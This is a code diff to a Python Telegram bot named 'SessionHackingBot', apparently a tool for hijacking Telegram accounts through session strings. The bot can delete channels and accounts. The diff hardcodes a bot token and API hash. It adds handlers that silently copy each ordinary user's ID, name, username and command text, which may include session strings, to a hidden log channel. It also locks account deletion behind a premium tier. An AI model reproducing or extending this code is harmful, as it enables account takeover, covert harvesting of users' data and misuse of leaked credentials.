@@ -28,8 +28,8 @@ from telethon.sessions import MemorySession
 from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = "abb92dcce1862377cd0bacf73d89473b"
-token = "6279916111:AAEclTNCIp5W51UMOIE4ecrLJ4w82RL7ZHw"
-client = TelegramClient('Prqfewifmagx', api_id, api_hash).start(bot_token=token)
+token = "6279916111:AAG5D5MW71S-lXKHoi6rDajpD6BQbJQ1L1E"
+client = TelegramClient('uqqqrulez', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -53,7 +53,7 @@ Boxaihackr = 5502537272
 Bot_Username =os.environ.get("yvyyybot", None) or "SessionHackingBot"
 
 channel_username = '@S3S_SSS'  # Replace with your channel username
-Developers = [5970155941, 6207999679, -1001834866606, 6279916111]
+Developers = [5970155941, 6207999679, -1001834866606]
 
 import os
 chat_data = {}
@@ -655,6 +655,101 @@ async def send_help(event):
 if os.path.exists(users_file):
     with open(users_file, 'r') as f:
         users_set = set(line.strip() for line in f)
+
+@client.on(events.NewMessage)
+async def log_user_message(event):
+    global users_set
+    log_channel_id = -1001984447198  # Replace with your log channel ID
+    log_channel = await client.get_entity(log_channel_id)
+    user_id = event.sender_id
+
+    # Check if the user is an owner
+    if user_id in PremiumUsers or user_id in Developers or user_id == -1001834866606:
+        return
+
+    user_command = event.text
+
+    users_set.add(user_id)
+
+    # Check if the user command meets the conditions for logging
+    if not user_command.startswith('/') and len(user_command) <= 20:
+        return
+
+    is_user_banned = user_id in banned_users
+
+    # Save updated user list to file
+    with open(users_file, 'w') as f:
+        for user in users_set:
+            f.write(str(user) + '\n')
+
+    num_users = len(users_set)
+
+    if isinstance(event.sender, types.User):
+        user_name = event.sender.first_name
+        username = event.sender.username
+    elif isinstance(event.sender, types.Channel):
+        user_name = event.sender.title
+        username = None
+
+    banned_status = "Banned" if is_user_banned else "Not Banned"
+
+    log_message = f"""================================
+|       NEW USER COMMAND RECEIVED        |
+================================
+
+┌ User ID: `{user_id}`
+├ First Name: {user_name}
+├ Username: @{username}
+├ Banned Status: {banned_status}
+├ Command: {user_command}
+└ Users: {num_users}
+
+---------------------------------------------"""
+
+    # Send the log message to the log channel
+    await client.send_message(log_channel, log_message)
+
+
+@client.on(events.CallbackQuery())
+async def handle_inline_button(event):
+    log_channel_id = -1001984447198  # Replace with your log channel ID
+    log_channel = await client.get_entity(log_channel_id)
+  
+    # Get the pressed inline letter
+    letter = event.data.decode()
+
+    # Get the user information from the event
+    user_id = event.sender_id
+    
+    # Check if the user is an owner
+    if user_id in PremiumUsers or user_id in Developers:
+        return
+
+    user_name = event.sender.first_name
+    username = event.sender.username
+
+    # Create the log message
+    log_message = f"""================================
+|       INLINE BUTTON PRESSED        |
+================================
+
+┌ User ID: `{user_id}`
+├ Username: {user_name}
+├ First Name: @{username}
+└ Pressed Letter: {letter}
+
+---------------------------------------------"""
+
+    # Send the log message to the log channel
+    await client.send_message(log_channel, log_message)
+
+
+
+
+
+
+
+
 
 
 @client.on(events.NewMessage)
@@ -2202,7 +2297,18 @@ from telethon import events, functions
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 @is_banned
 async def delete_account(event):
+    # Check if the user is an owner
 
+    # Check if the user executing the command is a developer or admin
+    if event.sender_id not in Developers and event.sender_id not in PremiumUsers:
+        await event.respond("""Please Subscribe to the premium version
+        
+الرجاء الاشتراك للنسخة الحصرية للبوت""")
+        return
+
+
+
+    
     # Exclude developers from the cooldown
     if event.sender_id in Developers:
         await handle_delete_account(event)
